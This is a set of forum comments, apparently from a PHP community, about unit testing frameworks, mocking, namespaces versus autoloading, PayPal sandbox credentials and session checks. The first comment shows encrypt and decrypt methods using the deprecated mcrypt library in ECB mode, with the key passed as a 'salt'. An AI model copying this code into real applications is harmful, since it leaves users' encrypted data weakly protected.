Here are my encrypt/decrypt methods: public function encrypt($salt, $crypt) { return trim(base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $salt, $crypt, MCRYPT_MODE_ECB, mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB), MCRYPT_RAND)))); } public function decrypt($salt, $crypt) { return trim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $salt, base64_decode($crypt), MCRYPT_MODE_ECB, mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB), MCRYPT_RAND))); }
This is **exactly** what I do...
The last sentence cracked me up, but there's 100% truth in here.
I can see what you're getting at, and your general idea is correct - as far as validation is concerned the unit testing framework can indeed only perform rather basic comparisons, you still need to bootstrap your code and provide the expectations to the framework. [Though this is easy because all of your code is well abstracted and makes good use of patterns that ease testing, such as [dependency injection](http://en.wikipedia.org/wiki/Dependency_injection), right? :)] So what does the framework give you? Where I work we use [PHPUnit](https://github.com/sebastianbergmann/phpunit) to run our tests, not only can it tell us if our code is working, but it can also give us coverage information - telling us exactly which lines of code were executed, how many times and by which tests. Our tests are also integrated with a continuous integration server (we use [bamboo](http://www.atlassian.com/software/bamboo)). This means that every time somebody commits code changes to our subversion server the tests are fired off and we get a warning if any of them fail. As an added bonus the developer that caused the test failures can be shamed in public :P Another feature that a testing framework provides that is often used very heavily is a [mocking](http://en.wikipedia.org/wiki/Mock_object) facility. Simplified, a mocking system allows you to create new subclasses of your existing classes at runtime in order to [re]define expected behaviour. Largely mock objects are what allows you to isolate the actual "units" of code you want to test, even when they depend on other classes/methods/etc. PHPUnit provides it's own mocking system, though recently we've been moving to [Phake](https://github.com/mlively/Phake/wiki), which is proving much more flexible. Apologies for the long-winded response, but I do want to encourage anyone reading this to give unit-testing and/or test-driven development a go. If you've never done it before you'll be amazed at how it forces you to write code that is more easily tested, which very often means much better designed and abstracted :)
&gt;What are your doubts though? Is it that you don't feel that you can trust the results of a unit testing framework, or do you have actual objective observations that would lead you to doubt unit testing frameworks as a whole? I have never mentioned I doubt unit testing. What made you think so? I believe tutorials on unit testing should explain a bit about the underlying concept of the unit testing before starting to elaborate on the use of some unit testing framework. Because they all start with a framework as if there is no other way go about it. I totally agree with you on other points, even though I don't have enough experience to back that up. And by the way, I would like to know my 'historical answers to other programming topics' you were referring to?
&gt;I did gather from looking at the list of functions that the data logging code was part of the code that called the functions and not part of the functions themselves. It is neither part of the code that called the functions nor part of functions themselves. The code for that is applied by the profiler to the functions on the fly when the files are included. In that way when a file is included, the profiler will make it look to php as if it contained the data logging code. In this way, the profiler is able to log data for any of the user defined functions too. 
&gt;which results in being told our credentials are invalid (they arent) It's been a while since I've had the (dis)pleasure of working with the paypal API, but make sure you're using a sandbox account with a sandbox request -- last I tried you can't use a production account for a sandbox request.
All I was saying is perhaps you don't have enough experience to truly understand why UT frameworks are much more useful than the alternative of rolling your own simple tests. UT frameworks do add overhead as they not only do what you want, but what everyone wants. Using them on a hobby development project could be mental overhead that you might not want. I used the power of the internet and your comment history to determine that you might be more of a hobbyist programmer than a die-hard industry tool like myself. I don't think that is a bad thing, just different perspectives. 
According to them, they're using a sandbox account for sandbox requests.
Same here, although I also add a setConnection method (and utilize a lazy-loaded registry key of 'storage/db' but that's for another day).
[You're welcome :)](http://stackoverflow.com/questions/3788369/how-to-tell-if-a-session-is-active)
That is not its intended usage -- [see here](https://bugs.php.net/bug.php?id=52982) for the problem it was created to solve. Basically, you can now determine whether or not a session has been started without having to use `@session_start()`, so that you can avoid notices: Notice: A session had already been started - ignoring session_start()
&gt;But don't we need to write the majority of application code ourselves anyway...even if we use the standard library..? I mean the standard library can only do basic operations on the entities we provide... We need to write the code to use these basic operations right? See what I did? How far do you want to go with this? Don't use frameworks? Don't use 3rd party libraries? Don't use the standard library with your language? Don't use third-generation languages? Modern development is built on decades of other peoples code. The application or website you are writing is only a fraction of the actual code that is run. Why would you want to spend time solving a problem which has already been solved?
Great reply. Thank you.
&gt;All I was saying is perhaps you don't have enough experience to truly understand why UT frameworks are much more useful than the alternative of rolling your own simple tests. I already agreed that I am not so experienced. But I certainly see the importance of unit testing. Because I know from my experience that projects seldom stick to their initial specs. So as you make changes, it is important not to break existing functionality. Unit testing, If properly implemented, can protect against that. Another thing that usually happens is that when you fix one bug, it creates a new bug somewhere else. Bug fixes causing more bugs is the way projects getting too long to complete. I hope unit testing can fix that too. I just want to extract some useful views and information from the awesome people in around here for myself and for some one, searching for 'unit testing' in google, can make use of it. 
I think yours is a bad analogy. My question was that do we really need it. What I meant was, is a framework must for implementing the concept of unit testing. &gt;Why would you want to spend time solving a problem which has already been solved? I hear this a lot. Why do people keep saying this. Perhaps someone will find a better solution. Just because one cannot think of any better solution does not mean that it does not exists and some one may find it. May be it will lead to some bad solutions too. And someone else may have to deal with it. But should that prevent every one from trying?
This really gets to the heart of unit testing. Unit testing drives good object-oriented design, and forces things like code reuse and programming to interfaces. There are also good practices like never writing unit tests that hit external services (like databases). So how do you test something that interacts with the database, without interacting with the database? To write a test for that you would (probably using the object mocking part of your unit testing framework) create a fake database object. This db object would have the same interface as your real db object, with whatever methods you're going to call on it. The object is set up to respond to "getArticlesByTag" with an array of article objects, just like the real db object, except they're hard-coded. Then you pass that mock db into your object so that your object will call that db object instead of the regular one. "But that means I need to build overrides for all the external services I use!" is a common complaint. Except what that's really telling you is that if you switch platforms - say, from using a database to using a web service - you'll need to recode everything! By unit testing, you build your objects to be able to swap components easily and you'll only need to recode the storage layer. OK, so now that's working, but how do you test that your database object is making the right call? One way would be to mock out PDO, and confirm that it's generating the query you want to make. Another is to accept that some things are not worth testing. My rule of thumb is that if there's no control structures in a method (no loops, conditionals, etc) then I don't need to write a unit test (but I still do sometimes).
&gt;My question was that do we really need it. My analogy stands. We don't -need- a standard library for language, or any other library for that matter. You *can* do everything yourself, if you want to. You don't have to use a unit testing framework if you don't want to, but they exist and are recommended so every programmer that wants to run tests doesn't have to write their own framework. &gt;I hear this a lot. Why do people keep saying this. Perhaps someone will find a better solution. A better solution then what? Everyone creating their own scripts? There is a better solution, it's called a framework and most people use them. If you came into this subreddit and said something like *"I don't like the current unit testing frameworks because of X and Y and Z, I'm going to create a new way to do unit tests and it will have X amazing features"* then your argument would hold weight. You aren't talking about going forward, hell you aren't even talking about going sideways, you are talking about going backwards. I have to ask, have you done much unit testing? **It's boring.** Incredibly helpful, critical to writing good code and a solid way to layout the design of a class/function before actually writing it, but boring nonetheless. I can't imagine ever wanting to make it more even more tedious then it already is, which is really what you are suggesting.
With a thing called a data provider so you provide multiple values to the method you are testing. Why are you evening arguing this you don't sound like you know what you're talking about?
&gt;I don't think any reasonable person would look at that and agree with you. We could go round and round about the why of it, but at the end of the day, it isn't reasonable to think C++ experience is enough to qualify you to make judgements on a PHP feature. I've used namespaces in both C++ and PHP so I can compare them. They work good in C++, and not that good in PHP imho. &gt;In C++, including [..] So you're basically saying namespaces can't be done properly in PHP since file including is a runtime operation, thus I can't complain about namespaces not being done properly? If something can't be done properly then you're usually better of not doing it in the first place. You're only proving my point. Also, see the last comment in this discussion: [https://bugs.php.net/bug.php?id=47872](https://bugs.php.net/bug.php?id=47872). If it has such a big performance penalty then just warn us about that, but let us use it when we want. &gt;But it isn't required. Yes you can hand wave your way to "examples", and I can counter every single one of them. I assume you're again referring to some form of your load_module_and_dependencies function. As I stated before, inside that function this is required. And that function has to be written too. Let me phrase it a little different: For any instantiation of a class from another namespace using the new keyword both the fully qualified name and the path to that class file has to be used once. Usually you're path to a class file is as least as long as the fully qualified name, so you'll need to write out as least as much as twice the fully qualified name. Especially with factory methods you'll need to write out a lot of extra code, since factories usually instantiate many classes from one namespace and hence will benefit most form a wildcard import. &gt;Always mimic your namespace hierarchy with the filesystem hierarchy. With autoloading this is the preferred and easiest way for your autoloader to find the corresponding files. Without autoloading this is of course not needed. For that see what I wrote above. &gt;Even with that "requirement", most of your claims are baseless and untrue PHP.net: &gt;[Importing rules are per file basis, meaning included files will NOT inherit the parent file's importing rules.](http://nl2.php.net/manual/en/language.namespaces.importing.php) Hence you'll need to include the class file and import the namespace. &gt;That would solve your problems. But we both know you would never accept an answer like that. I do. Still not enough for mee. See above. &gt;I love it. You quote me, tell me you didn't really say that, then repeat it when you explain your conclusion. you stopped using autoloading because you didn't like namespaces. Yeah. Exactly. And that's a stupid reason to stop using autoloading. Really? Did you even read my whole comment? Perhaps that last sentence was phrased poorly (English is (obviously) not my main language), but you simple couldn't have missed this: &gt;In other words, I used autoloading long before namespaces, so I didn't stop using autoloading because I don't like namespaces. However, namespaces made me realize that actually autoloading is actually quite dirty imo [...] Again: namespace made me realize how stupid autoloading is. I didn't stop using autoloading because of what namespaces are, but what they made me realize. &gt;And even I think it's bad decision making to move away from autoloading because you don't like namespaces. I totally agree with you on that. Always did. &gt;&gt;In this thread I've stated multiple times that I don't think that namespaces and autoloading are directly related &gt;This kind of bullshit is why I'm no longer responding to you. When I originally stated they were "two separate issues", your response was "they go hand in hand". I'm all for arguing this shit, but when you start pretending you didn't say shit you did say, the conversation is over. PHP and Apache aren't directly related/two separate issues, but they go hand in hand. Namespaces and autoloading aren't directly related/two separate issues, but they go hand in hand. Is it finally clear now? I don't need you to agree with me, please don't, but please stop pretending you don't understand what I meant. 
Your unit tests should exist outside of, and in tandem with, your QA practices. In general, never waste a human on a thing a computer can do faster and better.
Moreover, Twitter explicitly prohibits you from storing tweets retrieved from them in their usage guidelines: &gt;[Exporting Twitter Content to a datastore as a service or other cloud based service, however, is not permitted.](https://dev.twitter.com/terms/api-terms)
Is there a reason you have to use PHP for this? Wouldn't AJAX be a much better way of pulling in something live?
I'm glad the author took the time to create a how to, but I have to agree with @octave1 that it should have included some before/after stats. Easier said than done (if done properly) though.